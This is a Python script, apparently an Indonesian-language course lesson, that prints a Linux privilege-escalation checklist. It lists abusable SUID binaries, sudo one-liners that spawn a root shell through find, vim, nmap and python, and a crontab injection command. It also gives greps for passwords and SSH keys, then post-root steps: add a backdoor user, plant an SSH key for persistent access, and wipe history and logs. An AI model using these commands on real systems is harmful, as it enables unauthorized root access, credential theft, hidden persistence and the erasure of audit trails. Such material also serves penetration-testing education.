#!/usr/bin/env python3
"""Sesi 21: Privilege Escalation Check"""
import os, pwd, grp, socket, platform, subprocess

def banner():
    print("="*60)
    print("  SESI 21: PRIVILEGE ESCALATION CHECK")
    print("  Analogi: TAMU HOTEL dapet KUNCI MANAJER")
    print("="*60)

def cek_user():
    print("\n[1] INFO USER")
    try:
        print(f"  Current user: {os.getlogin()}")
    except: pass
    print(f"  UID/GID: {os.getuid()}/{os.getgid()}")
    print(f"  EUID: {os.geteuid()} (0=root)")
    if os.geteuid() == 0:
        print("  ⚠️ KAMU ROOT! Tidak perlu privilege escalation.")

def cek_os():
    print(f"\n[2] INFO OS")
    print(f"  System: {platform.system()} {platform.release()}")
    print(f"  Version: {platform.version()}")
    print(f"  Architecture: {platform.machine()}")
    print(f"  Hostname: {socket.gethostname()}")
    print("  Cari exploit: searchsploit linux kernel [version]")

def cek_suid():
    print(f"\n[3] CEK SUID BINARY (find / -perm -4000)")
    print("  SUID = program yang jalan dengan hak pemiliknya (biasanya root)")
    print("  Contoh berbahaya: nmap, vim, python, bash dengan SUID root")
    suid_berbahaya = ["nmap", "vim", "python", "python3", "bash", "sh",
                      "less", "more", "awk", "find", "perl", "ruby"]
    print(f"  Binary SUID berbahaya: {', '.join(suid_berbahaya)}")
    print("  Kalo binary ini SUID root -> kamu bisa langsung root!")

def cek_sudo():
    print(f"\n[4] CEK SUDO (sudo -l)")
    print("  Cek perintah apa saja yang bisa dijalankan sebagai root:")
    print("  $ sudo -l")
    print()
    print("  Contoh berbahaya:")
    dangerous = [
        "sudo find / -exec /bin/sh \\;  (root via find)",
        "sudo vim -c '!sh'               (root via vim)",
        "sudo nmap --interactive          (root via nmap)",
        "sudo python -c 'import os; os.system(\"/bin/sh\")'",
        "sudo less /etc/shadow            (baca file root)",
    ]
    for d in dangerous:
        print(f"  ⚠️  {d}")

def cek_cron():
    print(f"\n[5] CEK CRONTAB")
    print("  Cek file crontab yang bisa ditulis:")
    print("  $ ls -la /etc/cron*")
    print("  $ ls -la /var/spool/cron/")
    print()
    print("  Kalo file crontab writable oleh user, kamu bisa inject perintah!")
    print("  Contoh: echo '* * * * * root chmod 777 /tmp' >> /etc/crontab")

def cek_network():
    print(f"\n[6] CEK NETWORK & SERVICE")
    print("  $ ss -tlnp  atau  netstat -tlnp")
    print("  Cari service yang dengerin IP publik (0.0.0.0:PORT)")
    print("  Mungkin ada service internal yang bisa dieksploitasi")

def cek_file_sensitif():
    print(f"\n[7] CARI FILE SENSITIF")
    print("  $ grep -r 'password' /home/* 2>/dev/null")
    print("  $ grep -r 'PASSWORD' /etc/ 2>/dev/null")
    print("  $ find / -name '*.conf' -writable 2>/dev/null")
    print()
    print("  File yang mungkin berisi password:")
    files = [".bash_history", ".ssh/id_rsa", ".ssh/authorized_keys",
             "config.php", ".env", "wp-config.php", "settings.py"]
    for f in files:
        print(f"  - {f}")

def main():
    banner()
    cek_user()
    cek_os()
    cek_suid()
    cek_sudo()
    cek_cron()
    cek_network()
    cek_file_sensitif()
    print("\n" + "="*60)
    print("  LANGKAH SETELAH DAPAT AKSES ROOT:")
    print("  1. whoami (pastikan root)")
    print("  2. Buat backdoor user: useradd -m -G sudo hacker")
    print("  3. Install SSH key untuk akses permanen")
    print("  4. Bersihkan jejak: history -c, hapus log")
    print("="*60)

if __name__ == "__main__":
    main()
